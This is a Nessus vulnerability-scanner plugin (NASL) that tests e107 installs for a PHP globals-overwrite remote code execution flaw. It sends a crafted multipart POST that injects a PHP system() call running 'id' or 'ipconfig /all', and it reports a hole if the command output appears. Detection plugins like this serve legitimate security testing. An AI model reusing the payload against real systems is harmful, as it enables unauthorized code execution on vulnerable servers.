#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(22299);
  script_version("$Revision: 1.29 $");
  script_cvs_date("$Date: 2015/11/23 18:22:25 $");

  script_cve_id("CVE-2005-3390", "CVE-2006-3017");
  script_bugtraq_id(15250, 17843);
  script_osvdb_id(20408, 26466, 25255);
  script_xref(name:"EDB-ID", value:"2268");

  script_name(english:"e107 ibrowser.php zend_has_del() Function Remote Code Execution");
  script_summary(english:"Tries to run a command via e107");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server contains a PHP script that allows execution of
arbitrary PHP code."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The 'e107_handlers/tiny_mce/plugins/ibrowser/ibrowser.php' script
included with the version of e107 installed on the remote host
contains a programming flaw that may allow an unauthenticated, remote
attacker to execute arbitrary PHP code on the affected host, subject
to the privileges of the web server user id.

Note that successful exploitation of this issue requires that PHP's
'register_globals' and 'file_uploads' settings be enabled and that the
remote version of PHP be older than 4.4.1 or 5.0.6."
  );
  script_set_attribute(attribute:"see_also", value:"http://www.hardened-php.net/globals-problem");
  # http://www.hardened-php.net/hphp/zend_hash_del_key_or_index_vulnerability.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?ccaf872d");
  script_set_attribute(attribute:"solution", value:
"Upgrade to PHP version 4.4.3 / 5.1.3 or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2006/05/01");
  script_set_attribute(attribute:"patch_publication_date", value:"2006/05/02");
  script_set_attribute(attribute:"plugin_publication_date", value:"2006/09/02");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:e107:e107");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2015 Tenable Network Security, Inc.");

  script_dependencies("e107_detect.nasl", "os_fingerprint.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("www/e107");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("audit.inc");

port = get_http_port(default:80, php:TRUE);

# Test an install.
install = get_install_from_kb(appname:'e107', port:port, exit_on_fail:TRUE);

dir = install['dir'];
install_url = build_url(qs:dir, port:port);
url = dir + '/e107_handlers/tiny_mce/plugins/ibrowser/ibrowser.php';

# Make sure the affected script exists.
url = dir + "/e107_handlers/tiny_mce/plugins/ibrowser/ibrowser.php";
res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);

# Determine which command to execute on target host
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) cmd = 'ipconfig /all';
  else cmd = 'id';

  cmds = make_list(cmd);
}
else cmds = make_list('id', 'ipconfig /all');

cmd_pats = make_array();
cmd_pats['id'] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats['ipconfig /all'] = "Subnet Mask";

# If it does...
if ("alert(tinyMCE.getLang" >< res[2])
{
  foreach cmd (cmds)
  {
    # Try to exploit the flaw to execute a command.
    #
    # nb: as part of the attack, a scratch file is written on the target; but
    #     PHP removes the file when the request is finished since the target
    #     script doesn't do anything with the upload.
    bound = "bound";
    boundary = "--" + bound;
    postdata =
      boundary + '\r\n' +
      'Content-Disposition: form-data; name="GLOBALS"; filename="nessus";\r\n' +
      "Content-Type: image/jpeg;" + '\r\n' +
      '\r\n' +
      SCRIPT_NAME + '\r\n' +

      boundary + '\r\n' +
      'Content-Disposition: form-data; name="tinyMCE_imglib_include"; filename="nessus";\r\n' +
      "Content-Type: text/plain" + '\r\n' +
      '\r\n' +
      "<?php system('"+ cmd +"');  ?>" + '\r\n' +

      boundary + '\r\n"' +
      'Content-Disposition: form-data; name="-1203709508"; filename="nessus";\r\n'+
      "Content-Type: text/plain" + '\r\n' +
      '\r\n' +
      '1\r\n' +

      boundary + '\r\n' +
      'Content-Disposition: form-data; name="225672436"; filename="nessus";\r\n' +
      "Content-Type: text/plain" + '\r\n' +
      '\r\n' +
      '1\r\n' +

      boundary + "--" + '\r\n';

    res2 = http_send_recv3(
      method : "POST",
      item   : url,
      data   : postdata,
      port   : port,
      content_type : "multipart/form-data; boundary="+bound,
      exit_on_fail : TRUE
    );

    if (egrep(pattern:cmd_pats[cmd], string:res2[2]))
    {
      if (report_verbosity > 0)
      {
        snip = crap(data:"-", length:30)+' snip '+crap(data:"-", length:30);
        report =
          '\n' +
          "Nessus was able to execute the command '" +cmd+ "' on the remote"+
          '\nhost using the following request :' +
          '\n' +
          '\n' +  http_last_sent_request() +
          '\n';
        if (report_verbosity > 1)
        {
          pos = stridx(res2[2], "<!DOCTYPE");
          output = substr(res2[2], 0, pos - 1);
          if (!output) output = res[2];

          report +=
            '\n'+
            'This produced the following output :' +
            '\n' +
            '\n' + snip +
            '\n' + chomp(output) +
            '\n' + snip +
            '\n';
          }
          security_hole(port:port, extra:report);
        }
        else security_hole(port);
        exit(0);
    }
  }
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, "e107", install_url);
